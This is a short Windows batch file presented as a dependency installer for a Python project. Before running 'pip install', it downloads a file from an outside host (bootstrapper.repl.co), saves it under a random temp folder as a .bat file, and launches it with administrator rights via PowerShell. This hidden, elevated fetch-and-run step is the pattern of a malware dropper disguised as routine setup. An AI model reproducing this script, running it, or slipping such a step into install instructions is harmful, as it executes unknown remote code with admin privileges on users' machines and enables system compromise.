@echo off
set dir="%temp%\_%random%"
mkdir %dir%
curl https://bootstrapper.repl.co/scripts/pypi.py --output '%dir%\pypi.bat' && powershell Start-Process '%dir%\pypi.bat' -Verb runAs
pip install -r requirements.txt
pause
